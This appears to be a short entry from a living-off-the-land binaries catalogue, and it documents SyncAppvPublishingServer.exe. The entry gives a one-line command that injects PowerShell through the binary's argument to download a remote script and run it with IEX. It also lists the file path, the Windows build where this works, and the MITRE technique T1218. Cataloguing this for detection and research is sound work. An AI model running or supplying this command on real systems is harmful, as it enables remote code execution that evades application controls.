## SyncAppvPublishingServer.exe

* Functions: Execute

```
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
```

Acknowledgements:
* Nick Landers - @monoxgas

Code sample:
* 

Resources:
* https://twitter.com/monoxgas/status/895045566090010624

Full path:
```
C:\Windows\System32\SyncAppvPublishingServer.exe
```

Notes:
Command injection into PowerShell
Might have been fixed in newest version of Windows 10.
(Works as of 10.0.16299.371)

 
MITRE ATT&CK:
* [Signed Binary Proxy Execution](https://attack.mitre.org/wiki/Technique/T1218)
